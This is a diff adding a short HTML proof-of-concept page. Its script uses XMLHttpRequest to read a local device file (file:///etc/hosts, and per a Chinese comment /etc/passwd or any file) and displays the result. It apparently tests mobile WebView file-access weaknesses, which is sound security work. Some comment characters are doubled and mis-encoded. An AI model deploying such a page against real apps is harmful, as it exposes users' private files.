@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+        // 这个可以是⼿手机任意⼀一个⽂文件地址，如/etc/hosts、/etc/passwd
+        var localfile = "file:///etc/hosts"
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                var txt = xhr.responseText;
+                alert(txt);
+            }
+        }
+        try {
+            xhr.open("GET", localfile, true);
+            xhr.send();
+        } catch (ex) {
+            alert(ex.message);
+        }
+        </script>
+    </body>
+</html>
